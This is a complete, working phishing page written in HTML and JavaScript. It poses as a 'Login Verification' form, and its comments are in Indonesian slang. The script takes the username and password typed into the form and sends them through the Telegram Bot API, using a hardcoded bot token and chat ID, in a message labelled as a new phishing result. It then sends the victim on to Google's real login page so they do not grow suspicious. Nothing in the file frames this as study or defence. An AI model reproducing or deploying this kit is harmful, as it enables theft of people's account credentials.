<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: radial-gradient(circle, #1a202c 0%, #000000 100%); }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body class="flex items-center justify-center h-screen text-white">

    <div class="glass p-10 rounded-2xl shadow-2xl w-full max-w-md transform transition-all hover:scale-105">
        <div class="text-center mb-8">
            <div class="bg-blue-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-blue-500/50">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
            </div>
            <h2 class="text-3xl font-extrabold tracking-tight">Login Verification</h2>
            <p class="text-gray-400 mt-2 text-sm">Please verify your identity to continue.</p>
        </div>

        <form id="pancingan">
            <div class="mb-5">
                <label class="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Email or Username</label>
                <input type="text" id="target_user" class="w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" placeholder="example@mail.com" required>
            </div>
            <div class="mb-8">
                <label class="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Password</label>
                <input type="password" id="target_pass" class="w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" placeholder="••••••••" required>
            </div>
            <button type="submit" id="btn-submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg shadow-lg shadow-blue-600/30 transition-all active:scale-95">
                Authorize Access
            </button>
        </form>

        <div class="mt-6 text-center">
            <p class="text-xs text-gray-600 uppercase">Protected by Advanced Encryption Standard</p>
        </div>
    </div>

    <script>
        const form = document.getElementById('pancingan');
        
        // --- SETTING BOT TELEGRAM LO DISINI ---
        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
        const CHAT_ID = "8551809114";
        // --------------------------------------

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('btn-submit');
            btn.innerHTML = "Processing...";
            btn.disabled = true;

            const user = document.getElementById('target_user').value;
            const pass = document.getElementById('target_pass').value;

            // Format pesan yang masuk ke bot lo
            const pesan = `⚠️ **HASIL PHISHING BARU** ⚠️\n\n👤 User: \`${user}\` \n🔑 Pass: \`${pass}\` \n🌐 Source: Phishing Page V.2\n⏰ Time: ${new Date().toLocaleString()}`;

            // Kirim data pake Fetch API ke Telegram
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: pesan,
                    parse_mode: 'Markdown'
                })
            })
            .then(() => {
                // Alihin target ke web asli (misal Google) biar dia bingung tapi nggak curiga
                window.location.href = "https://accounts.google.com/login"; 
            })
            .catch(() => {
                alert("Connection Error. Please try again.");
                btn.innerHTML = "Authorize Access";
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
